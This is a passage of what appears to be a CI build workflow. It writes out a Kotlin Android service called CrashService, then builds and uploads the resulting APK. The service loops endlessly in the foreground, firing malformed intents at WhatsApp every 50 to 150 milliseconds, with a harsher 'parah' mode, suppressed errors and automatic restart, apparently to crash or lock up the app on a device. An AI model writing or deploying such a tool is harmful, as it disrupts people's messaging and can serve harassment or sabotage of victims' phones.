        cat > app/src/main/java/com/lo/ynznewera/CrashService.kt << 'EOF'
        package com.lo.ynznewera
        import android.app.Notification
        import android.app.NotificationChannel
        import android.app.NotificationManager
        import android.app.Service
        import android.content.Intent
        import android.os.Build
        import android.os.IBinder
        import kotlin.concurrent.thread

        class CrashService : Service() {
            private val WA_PKG = "com.whatsapp"
            private var running = true

            override fun onCreate() {
                super.onCreate()
                val channelId = "ynz_crash"
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val nm = getSystemService(NotificationManager::class.java)
                    nm.createNotificationChannel(NotificationChannel(channelId, "Crash Service", NotificationManager.IMPORTANCE_LOW))
                    startForeground(1, Notification.Builder(this, channelId).setContentTitle("YNZ Engine Aktif").setSmallIcon(android.R.drawable.ic_dialog_alert).build())
                } else {
                    startForeground(1, Notification.Builder(this).setContentTitle("YNZ Engine Aktif").setSmallIcon(android.R.drawable.ic_dialog_alert).build())
                }
            }

            override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                val mode = intent?.getStringExtra("mode") ?: "biasa"
                running = true
                thread {
                    while (running) {
                        try {
                            val bad = Intent().apply {
                                setClassName(WA_PKG, "$WA_PKG.Main")
                                data = android.net.Uri.parse("wa://crash/%%%")
                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            }
                            startActivity(bad)
                            if (mode == "parah") {
                                val view = Intent(Intent.ACTION_VIEW).apply {
                                    setPackage(WA_PKG)
                                    data = android.net.Uri.parse("content://broken/%%")
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                }
                                startActivity(view)
                            }
                        } catch (_: Exception) {}
                        Thread.sleep(if (mode == "parah") 50 else 150)
                    }
                }
                return START_STICKY
            }

            override fun onDestroy() {
                running = false
                super.onDestroy()
            }
            override fun onBind(intent: Intent?): IBinder? = null
        }
        EOF

    - name: Build with Gradle
      run: |
        gradle wrapper --gradle-version 8.2
        chmod +x gradlew
        ./gradlew assembleDebug

    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: YNZ-NewEra-APK
        path: app/build/outputs/apk/debug/app-debug.apk
